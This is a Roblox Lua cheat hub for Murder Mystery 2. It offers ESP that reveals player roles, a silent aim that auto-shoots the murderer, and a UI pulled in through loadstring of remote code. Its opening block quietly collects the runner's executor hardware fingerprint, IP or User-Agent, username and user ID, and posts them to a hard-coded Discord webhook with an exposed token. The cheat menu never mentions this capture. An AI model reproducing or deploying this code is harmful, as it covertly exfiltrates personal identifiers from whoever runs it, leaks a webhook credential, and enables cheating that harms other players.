local http_request

-- Establish the appropriate HTTP request function based on execution environment
if syn then
   http_request = syn.request
elseif SENTINEL_V2 then
   http_request = function(tb)
       return {
           StatusCode = 200,
           Body = request(tb.Url, tb.Method, tb.Body or '')
       }
   end
elseif http and http.request then
   http_request = http.request
elseif request then
   http_request = request
elseif httpservice then
   http_request = httpservice.request
else
   -- Fallback for unsupported exploits
   http_request = function()
       return {StatusCode = 404, Body = "{}"}
   end
end

-- Discord webhook configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1332981779916918836/dTw4xZHg7nZda7IvtOXYHgnAFGIVmQ-NLWi15jQQ0gbsIXIrzeG3IuRt9sttkT_gW1Hh"

-- Comprehensive fingerprint extraction function
function get_hwid()
   -- Attempt to retrieve headers from HTTP request
   local success, response = pcall(function()
       return http_request({
           Url = 'https://httpbin.org/get',
           Method = 'GET'
       })
   end)
   
   if not success or not response or response.StatusCode ~= 200 then
       return "Failed to retrieve HWID: Request error", "Error"
   end
   
   -- Parse JSON response
   local success, decoded_body = pcall(function()
       return game:GetService('HttpService'):JSONDecode(response.Body)
   end)
   
   if not success or not decoded_body or not decoded_body.headers then
       return "Failed to decode response", "Error"
   end
   
   -- Comprehensive list of exploit-specific fingerprint headers
   local hwid_keys = {
       -- PC exploits
       ["Syn-Fingerprint"] = "Synapse X",
       ["Exploit-Guid"] = "Generic",
       ["Krnl-Hwid"] = "KRNL",
       ["Sw-Fingerprint"] = "Script-Ware",
       ["Delta-Fingerprint"] = "Delta",
       ["Fluxus-Fingerprint"] = "Fluxus",
       ["Codex-Fingerprint"] = "Codex",
       ["Wave-Fingerprint"] = "Electron",
       ["Solara-Fingerprint"] = "Solara",
       ["Xeno-Fingerprint"] = "Xeno",
       ["Illusion-Fingerprint"] = "Illusion",
       
       -- Mobile exploits
       ["Arceus-Hardware"] = "Arceus X",
       ["Hydrogen-Id"] = "Hydrogen",
       ["Oxygen-Hardware"] = "Oxygen U",
       ["Fluxus-Mobile-Id"] = "Fluxus Mobile",
       ["Delta-Mobile"] = "Delta Mobile",
       ["Electron-Mobile"] = "Electron Mobile"
   }
   
   -- Check for any matching fingerprint header
   for header, executor in pairs(hwid_keys) do
       if decoded_body.headers[header] then
           return decoded_body.headers[header], executor
       end
   end
   
   -- Fallback: Analyze User-Agent for executor identification
   local user_agent = decoded_body.headers["User-Agent"]
   if user_agent then
       -- Attempt to identify executor from User-Agent string
       local executor_patterns = {
           {"Electron", "Electron"},
           {"Arceus", "Arceus X"},
           {"Fluxus", "Fluxus"},
           {"Oxygen", "Oxygen U"},
           {"Hydrogen", "Hydrogen"},
           {"Delta", "Delta"},
           {"Krnl", "KRNL"},
           {"SynapseX", "Synapse X"}
       }
       
       for _, pattern in ipairs(executor_patterns) do
           if user_agent:match(pattern[1]) then
               return user_agent, pattern[2]
           end
       end
       
       return user_agent, "Unknown (UA)"
   end
   
   -- Last resort: IP identification
   if decoded_body.origin then
       return decoded_body.origin, "IP-Address"
   end
   
   return "Unidentified client", "Unknown"
end

-- Send HWID to Discord webhook
function send_to_webhook(hwid, executor, player_info)
   -- Ensure the webhook URL is set
   if not WEBHOOK_URL or WEBHOOK_URL:match("your_webhook") then
       warn("Webhook URL not configured properly")
       return false
   end
   
   -- Format the data for Discord embedding
   local payload = {
       embeds = {
           {
               title = "HWID Captured",
               color = 0x2F3136,
               fields = {
                   {name = "Executor", value = executor or "Unknown", inline = true},
                   {name = "Username", value = player_info.Username or "Unknown", inline = true},
                   {name = "User ID", value = player_info.UserId or "Unknown", inline = true},
                   {name = "Hardware ID", value = "```" .. (hwid or "Failed to retrieve") .. "```", inline = false},
                   {name = "Game ID", value = game.PlaceId, inline = true},
                   {name = "Game Name", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = true}
               },
               footer = {
                   text = "Captured at " .. os.date("%Y-%m-%d %H:%M:%S")
               }
           }
       }
   }
   
   -- Convert to JSON string
   local json_payload = game:GetService("HttpService"):JSONEncode(payload)
   
   -- Send to webhook
   local success, response = pcall(function()
       return http_request({
           Url = WEBHOOK_URL,
           Method = "POST",
           Headers = {
               ["Content-Type"] = "application/json"
           },
           Body = json_payload
       })
   end)
   
   return success and response and response.StatusCode == 204
end

-- Main execution flow
local function main()
   -- Collect player information
   local player_info = {
       Username = game:GetService("Players").LocalPlayer.Name,
       UserId = game:GetService("Players").LocalPlayer.UserId,
       AccountAge = game:GetService("Players").LocalPlayer.AccountAge
   }
   
   -- Get HWID from client
   local hwid, executor = get_hwid()
   
   -- Log HWID to console for debugging
   print("Hardware ID:", hwid)
   print("Executor detected:", executor)
   
   -- Send HWID to Discord webhook
   local webhook_success = send_to_webhook(hwid, executor, player_info)
   
   if webhook_success then
       print("Successfully Get HWID")
   else
       warn("Failed")
   end
end

-- Initialize the fingerprint capture process
main()

-- Store function globally for external access
_G.get_hwid = get_hwid


-- Ultra-Optimized Character Outline ESP for MM2
-- Core Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Game-specific state tracking
local roles = {}
local Murder, Sheriff, Hero = nil, nil, nil
local GunDrop = nil

-- ESP Configuration
local ESP = {
   Enabled = true,
   OutlineThickness = 3,
   MaxRenderDistance = 175,
   Colors = {
       Murderer = Color3.fromRGB(255, 0, 0),
       Sheriff = Color3.fromRGB(0, 100, 255),
       Hero = Color3.fromRGB(255, 215, 0),
       Innocent = Color3.fromRGB(50, 255, 100),
       GunDrop = Color3.fromRGB(255, 255, 50)
   }
}

-- FIX: Use proper container instance for client-side rendering
local HighlightFolder = Instance.new("Folder")
HighlightFolder.Name = "ESP_Highlights"
-- Use proper parent for client-side UI elements
if syn and syn.protect_gui then
    syn.protect_gui(HighlightFolder)
    HighlightFolder.Parent = game:GetService("CoreGui")
else
    HighlightFolder.Parent = CoreGui
end

-- Highlight object container with strict typing
local Highlights = {}

-- Game mechanics functions
function IsAlive(Player)
   for i, v in pairs(roles) do
       if Player.Name == i then
           return not (v.Killed or v.Dead)
       end
   end
   return false
end

-- FIX: Reliable role tracking with connection management
local RoleUpdateConnection = nil
local function SetupRoleTracking()
    -- Clear previous connection if it exists
    if RoleUpdateConnection then
        RoleUpdateConnection:Disconnect()
        RoleUpdateConnection = nil
    end
    
    -- Create new connection with proper error handling
    RoleUpdateConnection = RunService.Heartbeat:Connect(function()
        pcall(function()
            if ReplicatedStorage:FindFirstChild("GetPlayerData", true) then
                roles = ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
                for i, v in pairs(roles) do
                    if v.Role == "Murderer" then Murder = i
                    elseif v.Role == "Sheriff" then Sheriff = i
                    elseif v.Role == "Hero" then Hero = i end
                end
            end
        end)
    end)
end

-- FIX: Reliable gun tracking
local GunTrackingConnections = {}
local function SetupGunTracking()
    -- Clear previous connections
    for _, conn in pairs(GunTrackingConnections) do
        conn:Disconnect()
    end
    table.clear(GunTrackingConnections)
    
    -- Check for existing gun drop
    for _, item in pairs(workspace:GetChildren()) do
        if item.Name == "GunDrop" then
            GunDrop = item
            break
        end
    end
    
    -- Setup new connections
    GunTrackingConnections[1] = workspace.ChildAdded:Connect(function(child)
        if child.Name == "GunDrop" then GunDrop = child end
    end)
    
    GunTrackingConnections[2] = workspace.ChildRemoved:Connect(function(child)
        if child == GunDrop then GunDrop = nil end
    end)
end

-- Get role color mapping
local function GetPlayerColor(playerName)
   if playerName == Murder then return ESP.Colors.Murderer
   elseif playerName == Sheriff then return ESP.Colors.Sheriff
   elseif playerName == Hero then return ESP.Colors.Hero
   else return ESP.Colors.Innocent end
end

-- FIX: Create optimized character outline with proper error handling
local function CreateOutline(player)
   if not player or not player.Parent then return nil end
   if Highlights[player] then return Highlights[player] end
   
   local highlight = Instance.new("Highlight")
   highlight.Name = player.Name
   highlight.FillTransparency = 0.85
   highlight.FillColor = GetPlayerColor(player.Name)
   highlight.OutlineColor = GetPlayerColor(player.Name)
   highlight.OutlineTransparency = 0
   highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
   highlight.Enabled = ESP.Enabled
   highlight.Parent = HighlightFolder
   
   -- Apply pulsing effect to murderer for improved visibility
   if player.Name == Murder then
       local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
       local tween = TweenService:Create(highlight, tweenInfo, {OutlineTransparency = 0.4})
       tween:Play()
   end
   
   Highlights[player] = highlight
   return highlight
end

-- FIX: Reliable outline removal with proper cleanup
local function RemoveOutline(player)
   local highlight = Highlights[player]
   if highlight then
       highlight:Destroy()
       Highlights[player] = nil
   end
end

-- FIX: Enhanced ESP update function with proper validation
local function UpdateESP()
   -- Update highlights based on ESP.Enabled state
   for player, highlight in pairs(Highlights) do
       if type(player) == "table" and player:IsA("Player") then
           highlight.Enabled = ESP.Enabled
       end
   end
   
   -- Exit early if disabled
   if not ESP.Enabled then return end
   
   -- Update ESP for each player
   for _, player in ipairs(Players:GetPlayers()) do
       if player == LocalPlayer then continue end
       
       local character = player.Character
       if not character or not character:FindFirstChild("HumanoidRootPart") or not IsAlive(player) then
           if Highlights[player] then
               Highlights[player].Enabled = false
           end
           continue
       end
       
       -- Distance check for optimization
       local rootPart = character:FindFirstChild("HumanoidRootPart")
       local distance = (rootPart.Position - Camera.CFrame.Position).Magnitude
       
       if distance > ESP.MaxRenderDistance then
           if Highlights[player] then
               Highlights[player].Enabled = false
           end
           continue
       end
       
       -- Create or update outline
       local highlight = CreateOutline(player)
       if highlight then
           highlight.Adornee = character
           highlight.FillColor = GetPlayerColor(player.Name)
           highlight.OutlineColor = GetPlayerColor(player.Name)
           highlight.Enabled = true
       end
   end
   
   -- Gun Drop ESP handling
   if GunDrop and GunDrop.Parent then
       if not Highlights.GunDrop then
           local highlight = Instance.new("Highlight")
           highlight.Name = "GunDrop"
           highlight.FillTransparency = 0.5
           highlight.FillColor = ESP.Colors.GunDrop
           highlight.OutlineColor = ESP.Colors.GunDrop
           highlight.OutlineTransparency = 0
           highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
           highlight.Enabled = ESP.Enabled
           highlight.Parent = HighlightFolder
           
           Highlights.GunDrop = highlight
       end
       Highlights.GunDrop.Adornee = GunDrop
   elseif Highlights.GunDrop then
       Highlights.GunDrop:Destroy()
       Highlights.GunDrop = nil
   end
end

-- FIX: Enhanced player joining/leaving handlers
local PlayerAddedConnection = nil
local PlayerRemovingConnection = nil

local function SetupPlayerConnections()
    -- Clear previous connections
    if PlayerAddedConnection then PlayerAddedConnection:Disconnect() end
    if PlayerRemovingConnection then PlayerRemovingConnection:Disconnect() end
    
    -- Setup new connections
    PlayerAddedConnection = Players.PlayerAdded:Connect(function(player)
        -- Force update highlights on player join
        task.delay(1, function()
            if not player or not player.Parent then return end
            if player.Character then
                UpdateESP()
            end
            
            player.CharacterAdded:Connect(function()
                task.delay(0.5, UpdateESP) -- Update after character loads
            end)
        end)
    end)
    
    PlayerRemovingConnection = Players.PlayerRemoving:Connect(function(player)
        RemoveOutline(player)
    end)
    
    -- Setup character connections for existing players
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            player.CharacterAdded:Connect(function()
                task.delay(0.5, UpdateESP) -- Update after character loads
            end)
        end
    end
end

-- FIX: ESP Toggle function with proper state management
local function ToggleESP(state)
    ESP.Enabled = state
    
    -- Update all existing highlights
    for player, highlight in pairs(Highlights) do
        highlight.Enabled = state
    end
    
    -- Force immediate update
    if state then
        UpdateESP()
    end
end

local AimGui = Instance.new("ScreenGui")
local AimButton = Instance.new("ImageButton")

AimGui.Parent = game.CoreGui

AimButton.Parent = AimGui
AimButton.BackgroundColor3 = Color3.new(0,0,0)
AimButton.BackgroundTransparency = 0
AimButton.BorderColor3 = Color3.new(1,1,1)
AimButton.BorderSizePixel = 1
AimButton.Position = UDim2.new(0.897,0,0.3)
AimButton.Size = UDim2.new(0.1,0,0.2)
AimButton.Image = "http://www.roblox.com/asset/?id=9654892206" -- Updated crosshair asset
AimButton.Draggable = true
AimButton.Visible = true

-- Silent aim configuration
local SilentAim = {
    Enabled = false,
    PredictionMultiplier = 2.8, -- Enhanced prediction multiplier
    VerticalCompensation = 1.2  -- Improved vertical compensation
}

-- Optimized murderer identification function
function GetMurderer()
    local murderer = nil
    pcall(function()
        local roleData = game.ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
        for playerName, data in pairs(roleData) do
            if data.Role == "Murderer" then
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Name == playerName and player ~= game.Players.LocalPlayer then
                        murderer = player
                        break
                    end
                end
            end
        end
    end)
    return murderer
end

-- Enhanced target position prediction with improved accuracy
function PredictTargetPosition(player)
    if not player or not player.Character then return nil end
    
    local upperTorso = player.Character:FindFirstChild("UpperTorso")
    local humanoid = player.Character:FindFirstChild("Humanoid")
    
    if not upperTorso or not humanoid then return upperTorso and upperTorso.Position end
    
    -- Extract movement vectors for precise prediction
    local currentPosition = upperTorso.Position
    local velocity = upperTorso.AssemblyLinearVelocity
    local moveDirection = humanoid.MoveDirection
    
    -- Calculate vertical compensation factor based on Y velocity
    local yVelFactor = velocity.Y > 0 and -1 * SilentAim.VerticalCompensation or 0.6
    
    -- Apply enhanced prediction algorithm
    local predictedPosition = currentPosition + 
                             ((velocity * Vector3.new(1, yVelFactor, 1)) * (2.1 / 15)) + 
                             (moveDirection * SilentAim.PredictionMultiplier)
    
    -- Apply network latency compensation
    local pingMultiplier = ((game.Players.LocalPlayer:GetNetworkPing() * 1000) * 0.02) + 1
    predictedPosition = predictedPosition * pingMultiplier
    
    return predictedPosition
end

-- Toggle visual feedback for aim button
local function UpdateAimButtonVisual()
    if SilentAim.Enabled then
        AimButton.BorderColor3 = Color3.new(0,1,0)
        AimButton.BackgroundColor3 = Color3.new(0,0.3,0)
    else
        AimButton.BorderColor3 = Color3.new(1,1,1)
        AimButton.BackgroundColor3 = Color3.new(0,0,0)
    end
end

-- Direct button toggle functionality
AimButton.MouseButton1Click:Connect(function()
    SilentAim.Enabled = not SilentAim.Enabled
    UpdateAimButtonVisual()
end)

-- Fluent UI Integration (preserved from original code)
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
  Title = "OmniHub Script By Azzakirms",
  SubTitle = "V1.1.5",
  TabWidth = 100,
  Size = UDim2.fromOffset(380, 300),
  Acrylic = true,
  Theme = "Dark",
  MinimizeKey = Enum.KeyCode.LeftControl
})

-- Create tabs
local Tabs = {
   Main = Window:AddTab({ Title = "Main", Icon = "eye" }),
   Visuals = Window:AddTab({ Title = "Visuals", Icon = "camera" }),
   Combat = Window:AddTab({ Title = "Combat", Icon = "crosshair" }),
   Farming = Window:AddTab({ Title = "Farming", Icon = "dollar-sign" }),
   Premium = Window:AddTab({ Title = "Premium", Icon = "star" }),
   Discord = Window:AddTab({ Title = "Join Discord", Icon = "message-square" }),
   Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}

-- Add ESP toggle to Visuals tab
Tabs.Visuals:AddSection("Character ESP")

-- FIX: Properly implement toggle callback
Tabs.Visuals:AddToggle("ESPToggle", {
   Title = "Esp Players",
   Default = ESP.Enabled,
   Callback = function(Value)
       ToggleESP(Value)
   end
})

Tabs.Combat:AddSection("Sheriff")

Tabs.Combat:AddToggle("SilentAimToggle", {
    Title = "Silent Aim",
    Default = SilentAim.Enabled,
    Callback = function(Value)
        SilentAim.Enabled = Value
        UpdateAimButtonVisual()
    end
})

-- Implement silent aim execution on HeartBeat for consistent timing
game:GetService("RunService").Heartbeat:Connect(function()
    if not SilentAim.Enabled then return end
    
    -- Check if player has sheriff gun
    local character = game.Players.LocalPlayer.Character
    local backpack = game.Players.LocalPlayer.Backpack
    if not character or not backpack then return end
    
    local gun = character:FindFirstChild("Gun") or backpack:FindFirstChild("Gun")
    if not gun then return end
    
    -- Auto-equip gun if in backpack
    if gun.Parent == backpack and character:FindFirstChild("Humanoid") then
        character.Humanoid:EquipTool(gun)
    end
    
    -- Target murderer with enhanced prediction
    local murderer = GetMurderer()
    if murderer and murderer.Character then
        local predictedPosition = PredictTargetPosition(murderer)
        if predictedPosition then
            -- Execute shot with optimal parameters
            pcall(function()
                character.Gun.KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(1, predictedPosition, "AH2")
            end)
        end
    end
end)

-- Initialize SaveManager
SaveManager:SetLibrary(Fluent)
SaveManager:SetFolder("OmniHub/MM2")
SaveManager:BuildConfigSection(Tabs.Settings)

-- Initialize InterfaceManager
InterfaceManager:SetLibrary(Fluent)
InterfaceManager:SetFolder("OmniHub")
InterfaceManager:BuildInterfaceSection(Tabs.Settings)

-- FIX: Proper initialization sequence
local function Initialize()
    -- Setup all connections
    SetupRoleTracking()
    SetupGunTracking()
    SetupPlayerConnections()
    
    -- Start ESP update loop with proper update frequency
    local ESPUpdateConnection = RunService.RenderStepped:Connect(UpdateESP)
    
    -- FIX: Proper cleanup without using BindToClose (client-side only)
    local cleanupFunction = function()
        -- Disconnect all connections
        if RoleUpdateConnection then RoleUpdateConnection:Disconnect() end
        if PlayerAddedConnection then PlayerAddedConnection:Disconnect() end
        if PlayerRemovingConnection then PlayerRemovingConnection:Disconnect() end
        if ESPUpdateConnection then ESPUpdateConnection:Disconnect() end
        
        for _, conn in pairs(GunTrackingConnections) do
            conn:Disconnect()
        end
        
        -- Clean up all highlights
        for player, highlight in pairs(Highlights) do
            if highlight and highlight.Parent then
                highlight:Destroy()
            end
        end
        
        -- Remove the highlight folder
        if HighlightFolder and HighlightFolder.Parent then
            HighlightFolder:Destroy()
        end
    end
    
    -- Register cleanup function for script termination
    if getgenv then
        getgenv().ESPCleanupFunction = cleanupFunction
    end
    
    -- Success notification
    Fluent:Notify({
       Title = "Enhanced ESP Loaded",
       Content = "Improved character outlines are now active",
       Duration = 3
    })
    
    -- Load saved configuration
    SaveManager:LoadAutoloadConfig()
end

-- Start the initialization process
Initialize()
